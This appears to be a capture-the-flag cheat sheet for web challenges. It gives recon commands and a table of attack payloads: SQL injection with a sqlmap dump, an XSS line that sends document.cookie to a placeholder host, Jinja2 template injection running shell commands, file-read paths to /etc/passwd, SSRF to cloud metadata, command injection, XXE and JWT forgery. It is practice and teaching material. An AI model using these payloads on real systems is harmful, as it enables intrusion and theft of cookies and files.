# Web

Script skeleton: `rangekit/ctf/templates/web_session.py` (`BURP=1` sends it through Burp).

## Recon

```bash
curl -si http://t/ | head -30             # headers: server, cookies, framework
curl -s http://t/robots.txt ; curl -s http://t/.git/HEAD ; curl -s http://t/sitemap.xml
ffuf -u http://t/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,403
whatweb http://t/
```

Read the page source and every JS file (endpoints, keys, commented-out code). Source code given? Read it before fuzzing.

## Vulnerability shortlist

| Sign | Try |
|---|---|
| `?id=`, search box | SQLi: `'`, `' OR 1=1-- -`, `sqlmap -u 'http://t/?id=1' --batch --dump` |
| reflected input | XSS: `<script>fetch('//YOUR/?c='+document.cookie)</script>`; check CSP |
| `{{7*7}}` shows `49` | SSTI (Jinja2): `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| file path / `?page=` | LFI: `../../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php` |
| URL fetcher | SSRF: `http://127.0.0.1:<port>/`, `file:///etc/passwd`, cloud metadata `169.254.169.254` |
| ping / host field | command injection: `;id`, `$(id)`, `` `id` ``, `\|\|id` |
| file upload | `.php`, `.phtml`, double extension, `Content-Type` swap, polyglot image |
| XML input | XXE: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` |
| `pickle`, `unserialize`, `ObjectInputStream` | deserialization gadget |
| JWT | `alg: none`, weak secret (`hashcat -m 16500`), `kid` injection |
| Flask `session` cookie | `flask-unsign --decode --cookie '<c>'`, `--unsign --wordlist` |
| Node / JSON merge | prototype pollution: `{"__proto__": {"admin": true}}` |

## Tools

- Burp Suite: Proxy history, Repeater for every interesting request, Intruder for small fuzzing.
- `jwt_tool`, `flask-unsign`, `sqlmap`, `ffuf`.
- A request bin for blind XSS/SSRF: webhook.site (online) or `python3 -m http.server` on a reachable host.
